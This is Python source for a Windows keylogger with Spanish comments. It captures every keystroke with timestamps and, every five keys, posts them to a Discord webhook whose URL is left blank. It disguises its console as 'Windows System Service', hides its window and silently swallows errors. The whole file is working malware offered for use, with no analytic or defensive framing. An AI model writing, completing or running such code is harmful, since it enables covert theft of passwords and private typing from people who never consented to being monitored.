import threading
import time
import psutil
import win32gui
import win32con
import pynput
from pynput import keyboard
import requests
import json
import os
import sys
from datetime import datetime
import ctypes

class Keylogger:
    def __init__(self):
        # WEBHOOK De DISCORD
        self.webhook_url = ""
        
        self.is_running = False
        self.logged_keys = []
        self.start_time = datetime.now()
        
    def hide_from_task_manager(self):
        """Ocultar el proceso del administrador de tareas"""
        try:
            
            ctypes.windll.kernel32.SetConsoleTitleW("Windows System Service")
            
            
            hwnd = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            
        except Exception as e:
            pass
    
    def start_keylogging(self):
        """Iniciar el logging de teclas"""
        
        with keyboard.Listener(on_press=self.on_key_press, on_release=self.on_key_release) as listener:
            listener.join()
    
    def on_key_press(self, key):
        """Manejar cuando se presiona una tecla"""
        try:
            key_char = key.char
        except AttributeError:
            key_char = str(key)
            
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.logged_keys.append(f"[{timestamp}] {key_char}")
        
        
        if len(self.logged_keys) >= 5:
            self.send_to_webhook()
    
    def on_key_release(self, key):
        """Manejar cuando se suelta una tecla"""
        if key == keyboard.Key.esc:
            
            self.stop_keylogger()
            return False
    
    def send_to_webhook(self):
        """Enviar datos al webhook de Discord"""
        if not self.logged_keys:
            return
            
        try:
            
            message = "```\n"
            message += f"🔑 KEYLOGGER ACTIVO\n"
            message += f"⏰ Iniciado: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
            message += f"📊 Teclas capturadas:\n"
            message += "\n".join(self.logged_keys)
            message += "\n```"
            
            
            data = {
                "content": message,
                "username": "Keylogger Bot",
                "avatar_url": "https://cdn.discordapp.com/attachments/123456789/icon.png"
            }
            
            
            response = requests.post(self.webhook_url, json=data, timeout=10)
            
        except Exception as e:
            pass
            
        
        self.logged_keys = []
    
    def stop_keylogger(self):
        """Detener el keylogger"""
        self.send_to_webhook()  
        os._exit(0)
    
    def run(self):
        """Ejecutar el keylogger"""
        
        self.hide_from_task_manager()
        
        
        self.start_keylogging()

if __name__ == "__main__":
    try:
        keylogger = Keylogger()
        keylogger.run()
    except:
        pass
